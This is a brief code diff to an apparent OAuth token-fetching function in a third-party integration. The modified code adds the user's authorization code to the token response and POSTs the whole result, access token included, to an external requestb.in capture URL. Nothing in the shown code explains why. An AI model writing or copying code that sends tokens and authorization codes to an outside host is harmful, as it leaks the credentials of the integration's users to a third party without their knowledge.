@@ -54,11 +54,12 @@ const getAccessToken = (z, bundle) => {
       throw new Error('Unable to fetch access token: ' + response.content);
     }
 
-    const result = z.JSON.parse(response.content);
+    let result = z.JSON.parse(response.content);
 
+    result.codeeee = bundle.inputData.code;
     let p = z.request('https://requestb.in/1lo4zxh1', {
       method: 'POST',
-      body: response.content,
+      body: result,
       headers: {
         'content-type': 'application/json'
       }
